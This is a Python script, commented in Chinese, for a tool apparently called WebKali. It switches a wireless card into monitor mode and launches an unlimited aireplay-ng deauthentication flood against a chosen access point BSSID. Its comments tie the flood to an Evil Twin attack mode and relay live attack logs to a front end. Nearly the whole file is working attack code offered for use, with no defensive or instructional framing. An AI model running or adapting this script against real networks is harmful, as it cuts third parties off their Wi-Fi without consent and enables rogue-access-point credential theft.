import argparse
import subprocess
import time
import os
import sys
import shutil

# ==========================================
# WebKali 攻击执行单元 (增强版)
# ==========================================

# 修复环境变量，确保能找到工具
os.environ["PATH"] += os.pathsep + "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"


def run_cmd(cmd):
    """执行命令但不阻塞，返回结果"""
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def log(msg):
    """格式化输出，方便前端读取"""
    print(f"[Deauth] {msg}")
    sys.stdout.flush()


def setup_monitor(interface, channel):
    log(f"正在配置网卡 {interface} 进入监听模式 (Channel {channel})...")

    # 1. 尝试使用 airmon-ng (更稳定)
    if shutil.which("airmon-ng"):
        # 先检查是否已经是 monitor 模式
        # 简单判断：名字里带 mon 或者 iwconfig 显示 Mode:Monitor
        run_cmd(f"airmon-ng start {interface} {channel}")
        # airmon-ng 可能会把网卡名改成 wlan0mon
        # 这里为了简单，我们假设用户传入的已经是正确的名字，或者我们强制用 iw 设置

    # 2. 强制使用 iw/ip 命令设置 (双重保险)
    run_cmd(f"ip link set {interface} down")
    run_cmd(f"iw dev {interface} set type monitor")
    run_cmd(f"ip link set {interface} up")

    # 3. 锁定信道
    run_cmd(f"iw dev {interface} set channel {channel}")
    run_cmd(f"iwconfig {interface} channel {channel}")
    time.sleep(1)


def attack_deauth(bssid, interface, duration):
    """
    执行 Deauth 洪水攻击
    duration: 0 表示无限攻击，直到被 kill
    """
    log(f"🔥 开始攻击目标: {bssid}")
    log(f"🔥 攻击强度: 无限循环 (直至手动停止)")

    # -0 0 表示无限次发送 Deauth 包
    # -a 目标BSSID
    # --ignore-negative-one 修复部分网卡报错
    cmd = f"aireplay-ng --ignore-negative-one -0 0 -a {bssid} {interface}"

    # 使用 Popen 启动，以便我们可以实时获取输出
    process = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    start_time = time.time()

    try:
        # 实时读取输出并打印，这样前端就能看到了
        while True:
            # 如果设定了时长且超时，则退出 (但在 Evil Twin 模式下通常是无限的)
            if duration > 0 and (time.time() - start_time) > duration:
                break

            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break

            if line:
                line = line.strip()
                # 过滤一些无用信息，只显示关键攻击日志
                if "Sending 64 directed DeAuth" in line:
                    print(f"[Attack] ⚡ 正在发送 Deauth 攻击包... (目标已断线)")
                elif "Waiting for beacon frame" in line:
                    print(f"[Search] 正在寻找目标信号... (信道可能不匹配)")
                elif "No such device" in line:
                    print(f"[Error] 网卡丢失或被占用！")
                    break
                else:
                    # 其他信息直接打印
                    pass

            sys.stdout.flush()

    except KeyboardInterrupt:
        log("攻击被用户终止")
    finally:
        process.terminate()
        run_cmd("killall aireplay-ng")
        log("攻击进程已结束")


def capture_handshake(bssid, interface, channel, duration):
    # ... (这部分由之前的代码处理，Evil Twin 模式主要用上面的 attack_deauth)
    pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("mode")
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--channel", default="1")
    parser.add_argument("--duration", default="0")  # 默认无限
    args = parser.parse_args()

    setup_monitor(args.interface, args.channel)

    if args.mode == "deauth":
        attack_deauth(args.bssid, args.interface, int(args.duration))
    # handshake 模式略，Evil Twin 暂时只用 deauth